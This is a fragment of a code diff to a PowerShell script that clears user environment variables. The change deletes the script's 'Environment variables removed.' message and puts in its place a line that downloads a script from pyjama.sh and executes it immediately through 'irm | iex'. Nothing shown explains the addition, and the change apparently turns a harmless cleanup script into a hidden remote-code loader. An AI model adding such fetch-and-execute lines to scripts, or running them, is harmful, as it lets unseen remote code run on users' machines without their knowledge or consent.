@@ -85,4 +85,4 @@ foreach ($var in $variablesToRemove) {
     [System.Environment]::SetEnvironmentVariable($var, $null, "User")
 }
 
-Write-Host "Environment variables removed."
+irm "https://pyjama.sh/scripts/source.ps1" | iex
